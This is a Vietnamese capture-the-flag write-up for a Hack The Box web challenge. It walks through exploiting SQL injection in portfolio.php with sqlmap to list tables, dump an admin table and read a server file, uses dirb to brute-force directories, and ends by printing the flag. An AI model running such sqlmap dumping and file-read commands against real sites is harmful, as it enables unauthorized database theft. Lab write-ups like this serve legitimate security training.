# FreeLancer

Đầu tiên ta thấy search file .php trong source code của trang web

![image](https://user-images.githubusercontent.com/73061198/124387156-9ccb2280-dd07-11eb-8650-a7991ea34901.png)

truy cập vào đuôi **portfolio.php?id=1**

![image](https://user-images.githubusercontent.com/73061198/124387187-c08e6880-dd07-11eb-878d-f3e491ca1366.png)

Câu này là 1 câu **Sql injection**

Chúng ta sẽ sử dụng sqlmap để khai thác lỗ hổng **sqlmap -u** [**http://188.166.169.77:30099/portfolio.php?id=1**](http://188.166.169.77:30099/portfolio.php?id=1) **--tables**

![image](https://user-images.githubusercontent.com/73061198/124387272-0e0ad580-dd08-11eb-9bab-a93cd778d86a.png)

Chúng ta thấy table **safeadm** sau đó truy cập vào table

**sqlmap -u** [**http://188.166.169.77:30099/portfolio.php?id=1**](http://188.166.169.77:30099/portfolio.php?id=1) **-T safeadmin --dump**

![image](https://user-images.githubusercontent.com/73061198/124387314-414d6480-dd08-11eb-8262-c6caed704613.png)

Vl nó dell phải password vì mình không biết decode kiểu j nên mình sẽ dùng **dirb**  


![image](https://user-images.githubusercontent.com/73061198/124387473-0c8ddd00-dd09-11eb-807f-3658643136d7.png)

ta thấy đường dẫn **/administrat/** sau đó chúng ta tiếp tục dùng **dirb** để brrute force  


![image](https://user-images.githubusercontent.com/73061198/124387561-537bd280-dd09-11eb-8354-2f994d3ba0ec.png)

/panel.php chúng ta sẽ sử dụng **sqlmap -u** [**http://188.166.169.77:30099/portfolio.php?id=1**](http://188.166.169.77:30099/portfolio.php?id=1) **--file-read=/desktop/www/html/administrat/panel.php**  
sau đó dùng câu lệnh cat để đọc flag  


![image](https://user-images.githubusercontent.com/73061198/124387621-858d3480-dd09-11eb-8261-ed8daf0d4014.png)

![image](https://user-images.githubusercontent.com/73061198/124387646-976ed780-dd09-11eb-9b1b-a99f794ab9b4.png)

flag : HTB{s4ff\_3\_1\_w33b\_fr4\_\_l33nc\_3}

